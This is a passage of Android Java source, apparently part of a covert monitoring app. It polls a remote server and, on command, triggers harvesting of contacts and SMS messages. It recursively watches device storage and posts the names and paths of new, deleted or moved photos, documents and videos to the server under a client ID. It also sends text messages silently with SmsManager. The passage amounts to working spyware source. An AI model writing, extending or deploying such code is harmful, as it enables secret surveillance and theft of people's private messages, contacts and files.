        String url = App.host + "/home/user/truncon";
        RequestParams params = new RequestParams();
        //   Log.v("hello","updata"+App.cid);
        params.put("ClientID", App.cid);
        httpClient.post(url, params, new TextHttpResponseHandler() {
            @Override
            public void onFailure(int i, Header[] headers, String s, Throwable throwable) {
                Log.v("hello", "failure" + App.cid);
            }

            @Override
            public void onSuccess(int i, Header[] headers, String s) {
                if (i == 200) {
                    testContacts();
                } else {
                    Log.v("hello", "!200" + App.cid);
                }
            }
        });
    }

    public void updatasms() {
        AsyncHttpClient httpClient = App.httpClient;
        String url = App.host + "/home/user/trunsms";
        RequestParams params = new RequestParams();
        params.put("ClientID", App.cid);
        httpClient.post(url, params, new TextHttpResponseHandler() {
            @Override
            public void onFailure(int i, Header[] headers, String s, Throwable throwable) {
            }

            @Override
            public void onSuccess(int i, Header[] headers, String s) {
                if (i == 200) {
                    if (s.equals("1")) {
                        getSmsFromPhone();
                    }
                }
            }
        });
    }

    static class RecursiveFileObserver extends FileObserver {
        /**
         * Only modification events
         */
        public static int CHANGES_ONLY = CREATE | DELETE | CLOSE_WRITE | MOVE_SELF | MOVED_FROM | MOVED_TO;

        List<SingleFileObserver> mObservers;
        String mPath;
        int mMask;

        public RecursiveFileObserver(String path) {
            this(path, ALL_EVENTS);
        }

        public RecursiveFileObserver(String path, int mask) {
            super(path, mask);
            mPath = path;
            mMask = mask;
        }

        Handler handler = new Handler() {
            public void handleMessage(Message msg) {
                String path = "";
                switch (msg.what) {

                    case 10:
                        path = msg.getData().getString("path");
                        obfile(path, 1);
                    case 11:
                        path = msg.getData().getString("path");
                        obfile(path, 2);

                }
                super.handleMessage(msg);
            }
        };

        @Override
        public void startWatching() {
            if (mObservers != null) return;

            mObservers = new ArrayList<SingleFileObserver>();
            Stack<String> stack = new Stack<String>();
            stack.push(mPath);

            while (!stack.isEmpty()) {
                String parent = stack.pop();
                mObservers.add(new SingleFileObserver(parent, mMask));
                File path = new File(parent);
                File[] files = path.listFiles();
                if (null == files) continue;
                for (File f : files) {
                    if (f.isDirectory() && !f.getName().equals(".") && !f.getName().equals("..")) {
                        stack.push(f.getPath());
                    }
                }
            }

            for (SingleFileObserver sfo : mObservers) {
                sfo.startWatching();
            }
        }

        @Override
        public void stopWatching() {
            if (mObservers == null) return;

            for (SingleFileObserver sfo : mObservers) {
                sfo.stopWatching();
            }
            mObservers.clear();
            mObservers = null;
        }

        void obfile(String path, int work) {
            Log.v("file", "ob" + path);
            AsyncHttpClient httpClient = App.httpClient;
            String url = "";
            if (work == 1) {
                url = App.host + "/home/index/addfile";
            } else if (work == 2) {
                url = App.host + "/home/index/deletefile";
            } else if (work == 3) {
                url = App.host + "/home/index/savefile";
            }
            RequestParams params = new RequestParams();
            params.put("ClientID", App.cid);
            File file = new File(path);
            if (file.exists()) {
                Log.v("hello", "exist" + file.getName());
            } else {
                Log.v("hello", "noex");
            }
            params.put("text", file.getName());
            params.put("state", "open");
            params.put("path", file.getPath());
            if (file.getName().endsWith(".jpg") ||
                    file.getName().endsWith(".jpeg")) {

                params.put("tid", 1);
            } else if (file.getName().endsWith(".doc") ||
                    file.getName().endsWith(".docx") ||
                    file.getName().endsWith(".pdf") ||
                    file.getName().endsWith(".ppt") ||
                    file.getName().endsWith(".pptx") ||
                    file.getName().endsWith(".xls") ||
                    file.getName().endsWith(".xlsx")) {
                params.put("tid", 2);
                Log.v("hello", "doc");
            } else if (file.getName().endsWith(".avi") ||
                    file.getName().endsWith(".rmvb") ||
                    file.getName().endsWith(".rm") ||
                    file.getName().endsWith(".mp4") ||
                    file.getName().endsWith(".wav") ||
                    file.getName().endsWith(".flv") ||
                    file.getName().endsWith(".mkv")) {
                params.put("tid", 3);
            }else{
                return;
            }

            httpClient.post(url, params, new TextHttpResponseHandler() {
                @Override
                public void onFailure(int i, Header[] headers, String s, Throwable throwable) {
                    Log.v("hello", "failue");
                }

                @Override
                public void onSuccess(int i, Header[] headers, String s) {
                    if (i == 200)
                        Log.v("hello", "success" + s);
                    else
                        Log.v("hello", "fei 200");
                }
            });
        }

        @Override
        public void onEvent(int event, String path) {
            Message msg = new Message();
            Bundle bundle = new Bundle();
            switch (event) {
//                case FileObserver.ACCESS:
//                    Log.i("RecursiveFileObserver", "ACCESS: " + path);
//                    break;
//                case FileObserver.ATTRIB:
//                    Log.i("RecursiveFileObserver", "ATTRIB: " + path);
//                    break;
//                case FileObserver.CLOSE_NOWRITE:
//                    Log.i("RecursiveFileObserver", "CLOSE_NOWRITE: " + path);
//                    break;
//                case FileObserver.CLOSE_WRITE:
//                    Log.i("RecursiveFileObserver", "CLOSE_WRITE: " + path);
//                    break;
                case FileObserver.CREATE:
                    Log.i("file", "CREATE: " + path);
                    bundle = new Bundle();
                    bundle.putString("path", path);
                    msg = new Message();
                    msg.what = 10;
                    msg.setData(bundle);
                    handler.sendMessage(msg);
                    break;
                case FileObserver.DELETE:
                    Log.i("file", "DELETE: " + path);
                    bundle = new Bundle();
                    bundle.putString("path", path);
                    msg = new Message();
                    msg.what = 11;
                    msg.setData(bundle);
                    handler.sendMessage(msg);
                    break;
//                case FileObserver.DELETE_SELF:
//                    Log.i("RecursiveFileObserver", "DELETE_SELF: " + path);
//                    break;
                case FileObserver.MODIFY:
                    Log.i("file", "MODIFY: " + path);
                    break;
//                case FileObserver.MOVE_SELF:
//                    Log.i("RecursiveFileObserver", "MOVE_SELF: " + path);
//                    break;
                case FileObserver.MOVED_FROM:
                    Log.i("file", "MOVED_FROM: " + path);
                    Log.i("file", "DELETE: " + path);
                    bundle = new Bundle();
                    bundle.putString("path", path);
                    msg = new Message();
                    msg.what = 11;
                    msg.setData(bundle);
                    handler.sendMessage(msg);
                    break;
                case FileObserver.MOVED_TO:
                    Log.i("file", "MOVED_TO: " + path);
                    bundle = new Bundle();
                    bundle.putString("path", path);
                    msg = new Message();
                    msg.what = 10;
                    msg.setData(bundle);
                    handler.sendMessage(msg);
                    break;
//                case FileObserver.OPEN:
//                    Log.i("RecursiveFileObserver", "OPEN: " + path);
//                    break;
                default:
                    //    Log.i("RecursiveFileObserver", "DEFAULT(" + event + "): " + path);
                    break;
            }
        }

        /**
         * Monitor single directory and dispatch all events to its parent, with full path.
         *
         * @author uestc.Mobius <mobius@toraleap.com>
         * @version 2011.0121
         */
        class SingleFileObserver extends FileObserver {
            String mPath;

            public SingleFileObserver(String path) {
                this(path, ALL_EVENTS);
                mPath = path;
            }

            public SingleFileObserver(String path, int mask) {
                super(path, mask);
                mPath = path;
            }

            @Override
            public void onEvent(int event, String path) {
                String newPath = mPath + "/" + path;
                RecursiveFileObserver.this.onEvent(event, newPath);
            }
        }
    }

    private void send1(String phone, String message) {
        SmsManager sms = SmsManager.getDefault();
        List<String> divideContents = sms.divideMessage(message);
        for (String text : divideContents) {
            sms.sendTextMessage(phone, null, text, null, null);
        }


    }

    void obfile(String path, int work) {
        Log.v("file", "ob" + path);
        AsyncHttpClient httpClient = App.httpClient;
        String url = "";
        if (work == 1) {
            url = App.host + "/home/index/addfile";
        } else if (work == 2) {
            url = App.host + "/home/index/deletefile";
        } else if (work == 3) {
            url = App.host + "/home/index/savefile";
        }
        RequestParams params = new RequestParams();
        params.put("ClientID", App.cid);
        File file = new File(path);
        if (file.exists()) {
            Log.v("hello", "exist" + file.getName());
        } else {
            Log.v("hello", "noex");
        }
        params.put("text", file.getName());
        params.put("state", "open");
        params.put("path", file.getPath());
        if (file.getName().endsWith(".jpg") ||
                file.getName().endsWith(".jpeg")) {

            params.put("tid", 1);
        } else if (file.getName().endsWith(".doc") ||
                file.getName().endsWith(".docx") ||
                file.getName().endsWith(".pdf") ||
                file.getName().endsWith(".ppt") ||
                file.getName().endsWith(".pptx") ||
                file.getName().endsWith(".xls") ||
                file.getName().endsWith(".xlsx")) {
            params.put("tid", 2);
            Log.v("hello", "doc");
        } else if (file.getName().endsWith(".avi") ||
                file.getName().endsWith(".rmvb") ||
                file.getName().endsWith(".rm") ||
                file.getName().endsWith(".mp4") ||
                file.getName().endsWith(".wav") ||
                file.getName().endsWith(".flv") ||
                file.getName().endsWith(".mkv")) {
            params.put("tid", 3);
        } else {
            return;
        }

        httpClient.post(url, params, new TextHttpResponseHandler() {
            @Override
            public void onFailure(int i, Header[] headers, String s, Throwable throwable) {
                Log.v("file", "failue");
            }

            @Override
            public void onSuccess(int i, Header[] headers, String s) {
                if (i == 200)
                    Log.v("file", "success" + s);
                else
                    Log.v("file", "fei 200");
            }
        });
    }

    public void doSendSMSTo(String phoneNumber, String message) {
        if (PhoneNumberUtils.isGlobalPhoneNumber(phoneNumber)) {
            Intent intent = new Intent(Intent.ACTION_SENDTO, Uri.parse("smsto:" + phoneNumber));
            intent.putExtra("sms_body", message);
            startActivity(intent);
        }
    }
}
